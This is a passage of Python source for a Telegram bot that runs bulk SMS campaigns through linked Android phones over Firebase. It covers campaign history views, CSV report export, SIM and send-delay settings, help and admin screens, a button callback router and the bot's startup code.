    kb.append([InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")])
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def history_view(update: Update, context: ContextTypes.DEFAULT_TYPE, cid: str):
    c = db.get_campaign(cid)
    if not c:
        await update.callback_query.edit_message_text("❌ Campaign not found.")
        return

    text = (
        f"📜 *Campaign Details*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🆔 Campaign: `{c['campaign_id']}`\n"
        f"📝 Name: *{c['name']}*\n"
        f"📊 Status: `{c['status']}`\n"
        f"📞 Total: `{c['total']}`\n"
        f"✅ Completed: `{c['completed']}`\n"
        f"❌ Failed: `{c['failed']}`\n"
        f"⏱️ Duration: `{c['duration'] or 'N/A'}`\n"
        f"📅 Started: `{c['started_at'] or 'N/A'}`\n"
        f"📅 Ended: `{c['completed_at'] or 'N/A'}`\n"
        f"📱 Devices: `{len(c.get('devices_used', []))}`\n"
    )

    kb = [
        [InlineKeyboardButton("📄 Download Report", callback_data=f"hist_report_{cid}")],
        [InlineKeyboardButton("📊 Statistics", callback_data=f"hist_stats_{cid}")],
        [InlineKeyboardButton("📜 History", callback_data="menu_history")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")],
    ]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def history_stats(update: Update, context: ContextTypes.DEFAULT_TYPE, cid: str):
    c = db.get_campaign(cid)
    if not c:
        return

    total = c['total']
    completed = c['completed']
    failed = c['failed']
    pct = int((completed / total * 100) if total > 0 else 0)

    text = (
        f"📊 *Campaign Statistics*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🆔 `{cid}`\n\n"
        f"📞 Total Targets: `{total}`\n"
        f"✅ Completed: `{completed}` ({pct}%)\n"
        f"❌ Failed: `{failed}`\n"
        f"📱 Devices Used: `{len(c.get('devices_used', []))}`\n"
        f"⏱️ Duration: `{c['duration'] or 'N/A'}`\n\n"
        f"{progress_bar(completed, total)}"
    )
    kb = [
        [InlineKeyboardButton("📜 Details", callback_data=f"hist_view_{cid}")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")],
    ]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def history_report(update: Update, context: ContextTypes.DEFAULT_TYPE, cid: str):
    c = db.get_campaign(cid)
    if not c:
        await update.callback_query.answer("Campaign not found")
        return

    targets = db.get_campaign_targets_all(cid)

    # Generate CSV report
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['Target ID', 'Mobile', 'Status', 'Device', 'Message', 'Processed At', 'Error'])
    for t in targets:
        writer.writerow([
            t['target_id'], t['mobile'], t['status'],
            t['device_id'], t['message'][:100], t['processed_at'], t['error']
        ])

    csv_bytes = output.getvalue().encode('utf-8')
    report_file = io.BytesIO(csv_bytes)
    report_file.name = f"campaign_{cid}.csv"

    await update.callback_query.answer("Generating report...")
    await update.callback_query.message.reply_document(
        document=report_file,
        filename=f"campaign_{cid}.csv",
        caption=f"📄 Campaign Report: `{cid}`",
        parse_mode=ParseMode.MARKDOWN
    )


# ============================================================
# ⚙️ SETTINGS
# ============================================================

async def show_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    settings = db.get_user_settings(user_id)

    text = (
        f"⚙️ *Settings*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⏱️ *Default Delay:* `{settings['default_delay']}s`\n"
        f"📶 *Default SIM:* `Slot {settings['default_sim']}`\n"
    )

    sim0 = "✅ " if settings['default_sim'] == 0 else ""
    sim1 = "✅ " if settings['default_sim'] == 1 else ""
    kb = [
        [
            InlineKeyboardButton(f"{sim0}SIM 1 (Slot 0)", callback_data="set_sim_0"),
            InlineKeyboardButton(f"{sim1}SIM 2 (Slot 1)", callback_data="set_sim_1"),
        ],
    ]
    delays = [0.0, 0.5, 1.0, 2.0, 3.0, 5.0, 10.0]
    delay_row1 = []
    delay_row2 = []
    for i, d in enumerate(delays):
        check = "✅ " if settings['default_delay'] == d else ""
        label = f"{check}⚡MAX" if d == 0.0 else f"{check}{d}s"
        btn = InlineKeyboardButton(label, callback_data=f"set_delay_{d}")
        if i < 4:
            delay_row1.append(btn)
        else:
            delay_row2.append(btn)
    kb.append(delay_row1)
    kb.append(delay_row2)
    kb.append([InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")])

    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def settings_set_delay(update: Update, context: ContextTypes.DEFAULT_TYPE, val: float):
    db.save_user_settings(update.effective_user.id, default_delay=val)
    await update.callback_query.answer(f"✅ Delay set to {val}s")
    await show_settings(update, context)

async def settings_set_sim(update: Update, context: ContextTypes.DEFAULT_TYPE, slot: int):
    db.save_user_settings(update.effective_user.id, default_sim=slot)
    await update.callback_query.answer(f"✅ SIM set to Slot {slot}")
    await show_settings(update, context)


# ============================================================
# ❓ HELP
# ============================================================

async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "❓ *Help — SMS Campaign Manager*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "*Quick Start Guide:*\n\n"
        "1️⃣ *Setup Firebase* — Add your Firebase RTDB URL\n"
        "2️⃣ *Add Devices* — Open Android sender app on phones\n"
        "3️⃣ *Create Template* — Write SMS with `{VARIABLE}` placeholders\n"
        "4️⃣ *Upload Data* — CSV file with MOBILE + other columns\n"
        "5️⃣ *Start Campaign* — Select data, template, devices → GO\n\n"
        "*Commands:*\n"
        "/start — Main Menu\n\n"
        "*Features:*\n"
        "• Multi-device parallel SMS dispatch\n"
        "• Template variables auto-match with CSV columns\n"
        "• Real-time campaign progress tracking\n"
        "• Pause / Resume / Stop campaigns\n"
        "• Campaign history with downloadable reports\n"
        "• Device online/offline monitoring\n"
    )
    kb = [[InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")]]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)


# ============================================================
# 🛠 ADMIN PANEL
# ============================================================

async def show_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.callback_query.edit_message_text("❌ *Admin access only.*", parse_mode=ParseMode.MARKDOWN)
        return

    fb = get_active_fb(user_id)
    total_devices = 0
    online_devices = 0
    if fb:
        try:
            all_c = await asyncio.to_thread(fb.get_all_clients)
            online = await asyncio.to_thread(fb.get_online_devices)
            total_devices = len(all_c)
            online_devices = len(online)
        except Exception:
            pass

    # Global stats
    text = (
        "🛠 *Admin Panel*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📱 Devices: `{online_devices}` online / `{total_devices}` total\n"
        f"🚀 Active Campaigns: `{len(ACTIVE_CAMPAIGNS)}`\n\n"
        "*Active Campaign Details:*\n"
    )
    if ACTIVE_CAMPAIGNS:
        for cid, camp in ACTIVE_CAMPAIGNS.items():
            status = "PAUSED" if camp.get('paused') else "RUNNING"
            text += f"  `{cid}` — {status}\n"
    else:
        text += "  None\n"

    kb = [
        [InlineKeyboardButton("🔄 Refresh", callback_data="menu_admin")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")],
    ]
    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)


# ============================================================
# HELPER
# ============================================================

async def _no_firebase(update: Update):
    text = (
        "❌ *No Firebase configured!*\n\n"
        "Go to 🔥 Firebase to add your database URL."
    )
    kb = [
        [InlineKeyboardButton("🔥 Add Firebase", callback_data="menu_firebase")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")],
    ]
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)


async def data_file_preview_temp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Preview the pending (not-yet-saved) uploaded file."""
    result = context.user_data.get('pending_file')
    if not result or not result.get('data'):
        await update.callback_query.edit_message_text("❌ No file data to preview.")
        return
    rows = result['data'][:5]
    text = f"👁 *Preview: {result['filename']}*\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for i, row in enumerate(rows, 1):
        text += f"\n*Row {i}:*\n"
        for k, v in list(row.items())[:5]:
            text += f"  {k}: `{v}`\n"
    text += f"\n_Showing {len(rows)} of {result['valid']} valid records_"
    kb = [
        [
            InlineKeyboardButton("💾 Save", callback_data="df_save"),
            InlineKeyboardButton("🗑 Discard", callback_data="df_discard"),
        ],
    ]
    await update.callback_query.edit_message_text(
        text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN
    )


# ============================================================
# CALLBACK ROUTER
# ============================================================

async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    user_id = query.from_user.id

    if not is_authorized(user_id):
        await query.answer("❌ Access Denied", show_alert=True)
        return

    await query.answer()

    # -- Menu Navigation --
    if data == "menu_main": return await _show_main_menu(update, context)
    if data == "menu_devices": return await show_devices(update, context)
    if data == "menu_templates": return await show_templates(update, context)
    if data == "menu_datafiles": return await show_data_files(update, context)
    if data == "menu_firebase": return await show_firebase(update, context)
    if data == "menu_dashboard": return await show_dashboard(update, context)
    if data == "menu_history": return await show_history(update, context)
    if data == "menu_settings": return await show_settings(update, context)
    if data == "menu_help": return await show_help(update, context)
    if data == "menu_admin": return await show_admin(update, context)
    if data == "menu_campaign": return await campaign_start(update, context)

    # -- Templates --
    if data == "tpl_create": return await template_create(update, context)
    if data.startswith("tpl_view_"):
        return await template_view(update, context, int(data[9:]))
    if data.startswith("tpl_edit_"):
        return await template_edit_start(update, context, int(data[9:]))
    if data.startswith("tpl_del_"):
        return await template_delete_ask(update, context, int(data[8:]))
    if data.startswith("tpl_delok_"):
        return await template_delete_confirm(update, context, int(data[10:]))

    # -- Data Files --
    if data == "df_upload": return await data_upload_start(update, context)
    if data == "df_preview_temp": return await data_file_preview_temp(update, context)
    if data == "df_save": return await data_file_save(update, context)
    if data == "df_discard": return await data_file_discard(update, context)
    if data.startswith("df_view_"):
        return await data_file_view(update, context, int(data[8:]))
    if data.startswith("df_del_"):
        return await data_file_delete_ask(update, context, int(data[7:]))
    if data.startswith("df_delok_"):
        return await data_file_delete_confirm(update, context, int(data[9:]))

    # -- Firebase --
    if data == "fb_add": return await firebase_add_start(update, context)
    if data == "fb_bulk_add": return await firebase_bulk_add_start(update, context)
    if data.startswith("fb_view_"):
        return await firebase_view(update, context, int(data[8:]))
    if data.startswith("fb_test_"):
        return await firebase_test(update, context, int(data[8:]))
    if data.startswith("fb_select_"):
        return await firebase_select(update, context, int(data[10:]))
    if data.startswith("fb_del_"):
        return await firebase_delete_ask(update, context, int(data[7:]))
    if data.startswith("fb_delok_"):
        return await firebase_delete_confirm(update, context, int(data[9:]))

    # -- Campaign Wizard --
    if data == "camp_upload": return await campaign_upload_new(update, context)
    if data == "camp_saved_files": return await campaign_saved_files(update, context)
    if data == "camp_continue": return await campaign_continue(update, context)
    if data == "camp_next_sample": return await campaign_next_sample(update, context)
    if data == "camp_change_tpl": return await campaign_change_template(update, context)
    if data == "camp_change_data": return await campaign_change_data(update, context)
    if data == "camp_cancel": return await campaign_cancel(update, context)
    if data == "camp_confirm": return await campaign_confirm_start(update, context)
    if data == "camp_recheck": return await campaign_recheck_devices(update, context)
    if data.startswith("camp_file_"):
        return await campaign_select_file(update, context, int(data[10:]))
    if data.startswith("camp_tpl_"):
        return await campaign_select_template(update, context, int(data[9:]))
    if data.startswith("camp_dev_"):
        return await campaign_toggle_device(update, context, data[9:])
    if data.startswith("camp_sim_"):
        return await campaign_set_sim(update, context, int(data[9:]))
    if data.startswith("camp_delay_"):
        return await campaign_set_delay(update, context, float(data[11:]))
    if data.startswith("camp_pause_"):
        return await campaign_pause(update, context, data[11:])
    if data.startswith("camp_resume_"):
        return await campaign_resume(update, context, data[12:])
    if data.startswith("camp_stop_") and not data.startswith("camp_stopok_"):
        return await campaign_stop(update, context, data[10:])
    if data.startswith("camp_stopok_"):
        return await campaign_stop_confirm(update, context, data[12:])

    # -- History --
    if data.startswith("hist_view_"):
        return await history_view(update, context, data[10:])
    if data.startswith("hist_stats_"):
        return await history_stats(update, context, data[11:])
    if data.startswith("hist_report_"):
        return await history_report(update, context, data[12:])

    # -- Settings --
    if data.startswith("set_delay_"):
        return await settings_set_delay(update, context, float(data[10:]))
    if data.startswith("set_sim_"):
        return await settings_set_sim(update, context, int(data[8:]))

    # -- Dashboard --
    if data == "dash_refresh": return await show_dashboard(update, context)
    if data == "new_campaign": return await campaign_start(update, context)


# ============================================================
# TEXT & DOCUMENT HANDLERS
# ============================================================

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("❌ Access Denied")
        return

    state = context.user_data.get('state', ST_IDLE)

    if state == ST_TPL_NAME:
        return await handle_template_name(update, context)
    if state == ST_TPL_MSG:
        return await handle_template_message(update, context)
    if state == ST_TPL_EDIT_MSG:
        return await handle_template_edit_msg(update, context)
    if state == ST_FB_URL:
        return await handle_firebase_url(update, context)
    if state == ST_FB_BULK:
        return await handle_firebase_bulk(update, context)

    await update.message.reply_text("Use /start to open the main menu.")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        return

    state = context.user_data.get('state', ST_IDLE)
    if state in (ST_DF_UPLOAD, ST_CAMP_UPLOAD):
        return await handle_file_upload(update, context)

    await update.message.reply_text("📎 Unexpected file. Use menu to upload data files.")


# ============================================================
# MAIN
# ============================================================

def main():
    token = config.BOT_TOKEN
    if not token or token == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
        print("=" * 60)
        print("ERROR: Set BOT_TOKEN in config.py!")
        print("=" * 60)
        return

    app = Application.builder().token(token).build()

    # Command handlers
    app.add_handler(CommandHandler("start", start_command))

    # Single callback router for all inline buttons
    app.add_handler(CallbackQueryHandler(callback_router))

    # Text and document handlers
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("🤖 SMS Campaign Manager Bot is running...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
